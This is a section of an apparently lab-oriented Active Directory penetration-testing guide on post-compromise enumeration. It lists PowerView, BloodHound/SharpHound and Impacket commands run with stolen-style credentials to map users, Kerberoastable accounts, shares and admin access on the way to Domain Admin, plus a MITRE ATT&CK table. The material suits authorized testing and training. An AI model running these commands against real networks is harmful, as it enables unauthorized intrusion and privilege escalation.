# 📋 Phase 3: Post-Compromise Enumeration

Once initial credentials are obtained, enumerate the AD environment deeply to plan the path to Domain Admin.

---

## 3.1 PowerView Enumeration

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Get domain info
Get-NetDomain
Get-DomainController

# Enumerate users
Get-DomainUser | Select-Object samaccountname, description, memberof
Get-DomainUser -SPN  # Find Kerberoastable accounts

# Enumerate groups
Get-DomainGroup | Select-Object name
Get-DomainGroupMember "Domain Admins"

# Find computers
Get-DomainComputer | Select-Object name, operatingsystem

# Find shares
Find-DomainShare -Verbose

# Find admin access
Find-LocalAdminAccess
```

---

## 3.2 BloodHound Collection

```bash
# Method 1: BloodHound.py from Kali (remote, no agent needed)
python3 bloodhound.py -d corp.local -u jsmith -p 'Password123!' -c All -ns 192.168.56.10

# Method 2: SharpHound from compromised Windows host
.\SharpHound.exe -c All --zipfilename loot.zip

# Start Neo4j and BloodHound
sudo neo4j start
bloodhound &
# Import the .zip file → Mark Domain Admins as High Value
# Run: "Find Shortest Paths to Domain Admins"
```

---

## 3.3 Impacket Enumeration

```bash
# List SMB shares
python3 smbclient.py corp.local/jsmith:Password123!@192.168.56.10

# List domain users via RPC
python3 rpcclient.py -U 'jsmith%Password123!' 192.168.56.10
enumdomusers
enumdomgroups

# Enumerate via LDAP
python3 ldapdomaindump.py -u 'corp.local\jsmith' -p 'Password123!' 192.168.56.10
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Domain Account Discovery | T1087.002 | PowerView, BloodHound |
| Remote System Discovery | T1018 | Get-DomainComputer |
| Network Share Discovery | T1135 | Find-DomainShare |
